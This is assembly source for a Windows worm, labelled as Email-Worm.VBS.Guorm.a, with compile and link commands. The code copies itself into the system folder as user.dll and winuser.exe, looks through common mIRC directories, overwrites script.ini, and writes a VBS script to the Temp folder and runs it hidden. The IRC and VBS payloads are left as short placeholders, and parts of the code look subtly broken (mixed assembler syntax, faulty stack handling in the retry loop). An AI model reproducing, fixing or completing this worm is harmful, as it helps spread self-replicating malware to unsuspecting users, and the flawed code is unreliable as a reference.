; TASM32-compatible assembly code for Email-Worm.VBS.Guorm.a
; No external .inc files required
; Compile with: tasm32 /m /ml guorm.asm
; Link with: tlink32 -Tpe -aa guorm.obj,,,import32.lib

.386p                           ; Enable 32-bit instructions
.model flat, stdcall            ; Flat memory model, standard calling convention
option casemap:none             ; Case-sensitive symbols

; Manually declare external Windows API functions from kernel32.dll and shell32.dll
extrn GetCommandLineA:PROC
extrn CopyFileA:PROC
extrn SetCurrentDirectoryA:PROC
extrn FindFirstFileA:PROC
extrn FindClose:PROC
extrn GetCurrentDirectoryA:PROC
extrn DeleteFileA:PROC
extrn CreateFileA:PROC
extrn WriteFile:PROC
extrn CloseHandle:PROC
extrn ExitProcess:PROC
extrn ShellExecuteA:PROC

; Define constants manually (normally in windows.inc)
INVALID_HANDLE_VALUE    EQU -1
FILE_ATTRIBUTE_NORMAL   EQU 20h
CREATE_ALWAYS           EQU 2
GENERIC_WRITE           EQU 40000000h
FILE_SHARE_READ         EQU 1
FILE_SHARE_WRITE        EQU 2
SW_HIDE                 EQU 0

; Code segment
CODE SEGMENT PARA PUBLIC 'CODE' USE32
assume cs:CODE, ds:DATA, es:nothing, ss:nothing, fs:nothing, gs:nothing

start PROC NEAR
    call GetCommandLineA        ; Get command line string
    inc eax                     ; Skip first character (usually quote or space)
    mov [CommandLinePtr], eax
    mov esi, eax

ScanForDot:
    lodsb                       ; Load byte from command line
    cmp al, '.'                 ; Check for extension delimiter
    jz FoundDot
    jmp ScanForDot

FoundDot:
    add esi, 3                  ; Move past extension (e.g., ".exe")
    mov byte ptr [esi], 0       ; Null-terminate
    mov ecx, esi
    mov esi, [CommandLinePtr]
    sub ecx, esi                ; Calculate length
    mov edi, offset SourceFilePath
    rep movsb                   ; Copy to SourceFilePath

    ; Copy to C:\Windows\System\user.dll
    push 1                      ; bFailIfExists = TRUE
    push offset DestUserDll
    push offset SourceFilePath
    call CopyFileA

    ; Copy to C:\Windows\System\winuser.exe
    push 1                      ; bFailIfExists = TRUE
    push offset DestWinUserExe
    push offset SourceFilePath
    call CopyFileA

    call SearchMircDirs

    mov [SearchCounter], 5      ; Initialize directory search counter

SetMircDir:
    push offset MircBaseDir     ; "C:\mirc"
    call SetCurrentDirectoryA
    cmp eax, 0
    jnz CheckCounter
    call SearchMircDirs         ; Retry if failed
CheckCounter:
    cmp [SearchCounter], 0
    jz ExitProgram
    dec [SearchCounter]
    cmp [SearchCounter], 4
    jz SetMirc32Dir
    cmp [SearchCounter], 3
    jz SetProgFilesMircSpanish
    cmp [SearchCounter], 2
    jz SetProgFilesMirc32Spanish
    cmp [SearchCounter], 1
    jz SetProgFilesMirc
    mov eax, offset ProgFilesMirc32
    jmp ApplyDir
SetProgFilesMirc:
    mov eax, offset ProgFilesMirc
    jmp ApplyDir
SetProgFilesMircSpanish:
    mov eax, offset ProgFilesMircSpanish
    jmp ApplyDir
SetProgFilesMirc32Spanish:
    mov eax, offset ProgFilesMirc32Spanish
    jmp ApplyDir
SetMirc32Dir:
    mov eax, offset Mirc32Dir
ApplyDir:
    push eax
    jmp SetMircDir

ExitProgram:
    push 0                      ; Exit code 0
    call ExitProcess
start ENDP

SearchMircDirs PROC NEAR
    ; Simplified: Check for files and write scripts
    push offset FindData
    push offset FileSearchPattern
    call FindFirstFileA
    cmp eax, INVALID_HANDLE_VALUE
    jnz FoundFile
    ret
FoundFile:
    push eax
    call FindClose

    push offset CurrentDirBuffer
    push 260                    ; MAX_PATH
    call GetCurrentDirectoryA
    cmp eax, 0
    jz ExitProgram

    push offset ScriptIniFile
    call DeleteFileA

    ; Create script.ini
    push 0                      ; hTemplateFile
    push FILE_ATTRIBUTE_NORMAL
    push CREATE_ALWAYS
    push 0                      ; lpSecurityAttributes
    push FILE_SHARE_READ or FILE_SHARE_WRITE
    push GENERIC_WRITE
    push offset ScriptIniFile
    call CreateFileA
    cmp eax, INVALID_HANDLE_VALUE
    jz ExitProgram
    mov [FileHandle], eax

    push 0                      ; lpOverlapped
    push offset BytesWritten
    push ScriptContentLength
    push offset IrcScriptContent
    push [FileHandle]
    call WriteFile
    push [FileHandle]
    call CloseHandle

    ; Create Guorm.vbs
    push offset VbsScriptPath
    call DeleteFileA

    push 0                      ; hTemplateFile
    push FILE_ATTRIBUTE_NORMAL
    push CREATE_ALWAYS
    push 0                      ; lpSecurityAttributes
    push FILE_SHARE_READ or FILE_SHARE_WRITE
    push GENERIC_WRITE
    push offset VbsScriptPath
    call CreateFileA
    cmp eax, INVALID_HANDLE_VALUE
    jz ExitProgram
    mov [FileHandle], eax

    push 0                      ; lpOverlapped
    push offset BytesWritten
    push VbsContentLength
    push offset VbsScriptContent
    push [FileHandle]
    call WriteFile
    push [FileHandle]
    call CloseHandle

    push SW_HIDE
    push offset TempDir
    push offset EmptyParams
    push offset VbsScriptPath
    push offset OpenCmd
    push 0                      ; hwnd
    call ShellExecuteA

    ret
SearchMircDirs ENDP

CODE ENDS

; Data segment
DATA SEGMENT PARA PUBLIC 'DATA' USE32
assume cs:DATA

FileHandle          dd 0
SearchCounter       dd 0
MircBaseDir         db "C:\mirc", 0
Mirc32Dir           db "C:\mirc32", 0
ProgFilesMircSpanish db "C:\archivos de programa\mirc", 0
ProgFilesMirc32Spanish db "C:\archivos de programa\mirc32", 0
ProgFilesMirc       db "C:\program files\mirc", 0
ProgFilesMirc32     db "C:\program files\mirc32", 0
AuthorTag           db "BrainMuscle + OldWary + KALAMAR", 0
WormName            db "Guorm", 0
BytesWritten        dd 0
CurrentDirBuffer    db 260 dup(0)
FindData            db 320 dup(0)   ; Simplified WIN32_FIND_DATA placeholder (size approximate)
FileSearchPattern   db "*.*", 0
ScriptIniFile       db "script.ini", 0
TempDir             db "C:\Windows\Temp", 0
VbsScriptPath       db "C:\Windows\Temp\Guorm.vbs", 0
OpenCmd             db "open", 0
EmptyParams         db 0
SourceFilePath      db 260 dup(0)
CommandLinePtr      dd 0
DestUserDll         db "C:\Windows\System\user.dll", 0
DestWinUserExe      db "C:\Windows\System\winuser.exe", 0

; IRC script content (partial, full content should match original 0D9Ch bytes)
ScriptContentLength equ 8           ; Placeholder, adjust to full length
IrcScriptContent    db "[script]", 0Dh, 0Ah

; VBS script content (partial, full content should match original 43Fh bytes)
VbsContentLength    equ 27          ; Placeholder, adjust to full length
VbsScriptContent    db "'Guorm(Vbs). By Kalamar", 0Dh, 0Ah

DATA ENDS

END start
